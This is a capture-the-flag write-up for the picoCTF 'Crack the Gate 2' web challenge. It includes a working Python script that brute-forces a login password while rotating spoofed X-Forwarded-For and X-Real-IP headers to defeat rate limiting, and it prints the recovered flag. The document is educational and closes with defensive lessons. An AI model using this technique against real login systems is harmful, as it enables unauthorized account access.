# ðŸ§© CTF Challenge Writeup  
**Challenge Name:** Crack the Gate 2  
**Category:** Web Exploitation  
**Difficulty:** Medium  
**Platform:** picoMini by CMU-Africa  
**Author:** YAHAYA MEDDY  
**Date:** 20-02-26  

---

## ðŸ” 1. Challenge Description

The challenge presents a website with the following description:

> *"The login system has been upgraded with a basic rate-limiting mechanism that locks out repeated failed attempts from the same source. We've received a tip that the system might still trust user-controlled headers. Your objective is to bypass the rate-limiting restriction and log in using the known email address: ctf-player@picoctf.org and uncover the hidden secret."*

A login page is provided along with a **passwords list** to download.  
The challenge name **Crack the Gate 2** and the hint **"You can rotate fake IPs to bypass rate limits"** strongly suggest combining **IP spoofing via HTTP headers** with **password brute forcing**.

---

## ðŸ§  2. Initial Thoughts / Approach

Given:
- **Web Exploitation** category  
- **Medium** difficulty  
- Known email: `ctf-player@picoctf.org`
- A downloadable **passwords list** is provided
- Rate limiting blocks repeated failed attempts from the same IP
- Hint: system **trusts user-controlled headers**

Key observations:
- The server uses the client IP to enforce rate limiting
- HTTP headers like `X-Forwarded-For` and `X-Real-IP` are commonly used to pass the real client IP through proxies
- If the server **trusts these headers without validation**, we can fake a different IP on every request
- By rotating fake IPs with each attempt, we can bypass the rate limit entirely
- Inspecting the page source reveals the form submits as **JSON** to `/login` â€” not a standard form POST

The intended approach is to **brute force the password** while **rotating the `X-Forwarded-For` header** on every request to bypass rate limiting.

---

## ðŸ› ï¸ 3. Steps to Solve

### 3.1 Open the Website
Navigate to:
```
http://amiable-citadel.picoctf.net:65442/
```
A clean login page appears with **Email** and **Password** fields.

### 3.2 Inspect the Page Source
Press `F12` â†’ **Elements** tab. The JavaScript reveals:
```javascript
fetch('/login', {
    method: 'POST',
    headers: {
        'Content-Type': 'application/json'
    },
    body: JSON.stringify(formData)
})
.then(response => response.json())
.then(data => {
    if (data.success) {
        prompt('Login successful!\nFlag:', data.flag);
    } else if (data.error) {
        alert(data.error);
    } else {
        alert('Invalid credentials');
    }
})
```

This tells us:
- The endpoint is `/login`
- Data is sent as **JSON** (not form data)
- On success, the flag is in `data.flag`

### 3.3 Download the Passwords List
Download the provided `passwords.txt` file from the challenge page.

### 3.4 Set Up Python Environment
```bash
python3 -m venv venv
source venv/bin/activate
pip install requests beautifulsoup4
```

### 3.5 Write the Brute Force Script
```python
import requests
import json

url = "http://amiable-citadel.picoctf.net:65442/login"
email = "ctf-player@picoctf.org"

with open("passwords.txt", "r") as f:
    passwords = f.read().splitlines()

for i, password in enumerate(passwords):
    # Rotate fake IP on every request to bypass rate limiting
    fake_ip = f"10.0.{i // 256}.{i % 256}"
    
    headers = {
        "Content-Type": "application/json",
        "X-Forwarded-For": fake_ip,
        "X-Real-IP": fake_ip
    }
    
    data = json.dumps({
        "email": email,
        "password": password
    })
    
    r = requests.post(url, data=data, headers=headers)
    response = r.json()
    
    print(f"[-] Trying: {password}")
    
    if response.get("success"):
        print(f"\n[+] SUCCESS! Password: {password}")
        print(f"[+] Flag: {response.get('flag')}")
        break
```

### 3.6 Run the Script
```bash
python3 crackGate2.py
```

The script iterates through the passwords list, rotating a fake IP on every attempt. After 19 attempts, the correct password is found:

```
[-] Trying: tKzytEv9
[-] Trying: gcMwJJ4z
...
[-] Trying: axTtBLvc

[+] SUCCESS! Password: axTtBLvc
[+] Flag: picoCTF{xff_byp4ss_brut3_3b2dc94d}
```

---

## ðŸ§© 4. Final Flag

```
picoCTF{xff_byp4ss_brut3_3b2dc94d}
```

---

## ðŸ“š 5. Key Learnings

- **`X-Forwarded-For` and `X-Real-IP` headers are user-controlled** â€” never trust them for security decisions
- If a server uses these headers to identify clients for rate limiting, the rate limit is trivially bypassed by rotating fake IPs
- Always inspect JavaScript source â€” the form used `fetch()` with JSON, not a standard form POST, which required adjusting the script accordingly
- **`Content-Type: application/json`** must be set when sending JSON data or the server may reject the request
- Rate limiting alone is not sufficient protection against brute force if the IP identification mechanism can be spoofed
- The flag name `xff_byp4ss_brut3` = XFF (X-Forwarded-For) bypass + brute force â€” exactly what was done

---

## ðŸš€ 6. Improvements for Next Time

- Always inspect the page source **before** writing the brute force script â€” find the exact endpoint and content type
- Check if the form uses `fetch()` with JSON vs standard form POST â€” these require different approaches in Python (`json.dumps()` vs `data={}`)
- Use `X-Forwarded-For` rotation immediately when rate limiting is mentioned in the challenge
- Generate fake IPs systematically using `f"10.0.{i // 256}.{i % 256}"` to ensure uniqueness per attempt
- Check `response.json()` instead of `response.text` when the API returns JSON

---

## ðŸ”— 7. References

- [MDN Web Docs â€“ X-Forwarded-For Header](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Forwarded-For)
- [OWASP â€“ Testing for Brute Force](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/04-Authentication_Testing/03-Testing_for_Weak_Lock_Out_Mechanism)
- [Python Requests Documentation](https://docs.python-requests.org/en/latest/)
- [OWASP â€“ Broken Access Control](https://owasp.org/Top10/A01_2021-Broken_Access_Control/)
- [picoCTF Web Exploitation Challenges](https://picoctf.org)